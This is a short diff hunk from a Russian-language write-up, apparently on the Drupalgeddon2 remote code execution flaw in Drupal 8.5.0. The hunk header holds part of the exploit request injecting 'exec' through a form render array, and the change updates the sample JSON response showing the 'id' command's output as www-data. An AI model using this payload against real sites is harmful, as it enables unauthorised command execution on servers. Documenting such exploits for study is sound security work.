@@ -42,7 +42,7 @@ form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=
 Уязвимая версия Drupal 8.5.0 выполняет команду `id` и возвращает результат:
 
 ```json
-[{"command":"insert","data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)"}]
+[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
 ```
 
 [screenshot_exploit_success]
